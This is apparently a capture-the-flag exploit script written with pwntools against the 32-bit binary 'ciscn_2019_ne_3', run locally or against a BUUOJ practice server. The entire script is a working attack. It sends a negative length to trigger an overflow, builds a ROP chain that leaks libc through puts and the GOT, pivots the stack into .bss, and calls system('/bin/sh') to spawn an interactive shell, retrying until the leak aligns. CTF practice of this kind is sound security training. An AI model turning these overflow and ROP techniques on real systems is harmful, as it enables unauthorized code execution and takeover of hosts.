import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	try :
		if len(sys.argv)==1 :
			io=process('./ciscn_2019_ne_3')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./ciscn_2019_ne_3')
			libc=ELF('/lib/i386-linux-gnu/libc.so.6')
			ld = ELF('/lib/i386-linux-gnu/ld-2.27.so')
		else :
			io=remote('node3.buuoj.cn',27379)
			elf=ELF('./ciscn_2019_ne_3')
			libc=ELF('../../i386libc/libc.so.6')
			ld = ELF('/lib/i386-linux-gnu/ld-2.27.so')

		io.recv()
		io.send('1')
		io.recv()
		io.sendline('-1')
		io.recv()
		# pause()
		start=0x080484F0
		pay=p32(elf.plt['puts'])+p32(0x08048431)+p32(elf.got['read'])+p32(0x0804881b)+p32(elf.bss()+0x300)+p32(elf.plt['read'])+p32(0x08048575)+p32(0)+p32(elf.bss()+0x300)+p32(0x100)
		pay=pay.ljust(0x48,'\x00')+'\x58'
		io.send(pay)
		io.recvuntil('well, please contiune\n')
		libc_base=u32(io.recv()[:4])-libc.sym['read']
		if libc_base&0xfff!=0 :
			io.close()
			continue
		libc.address=libc_base
		success('libc_base:'+hex(libc_base))
		sleep(1)
		pay=p32(elf.bss()+0x300)+p32(libc.sym['system'])+p32(1)+p32(libc.search('/bin/sh\x00').next())
		# gdb.attach(io,'b *0x0804a144')
		io.send(pay)

			


		
		# libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	except Exception as e:
		io.close()
		continue
	# else:
	# 	continue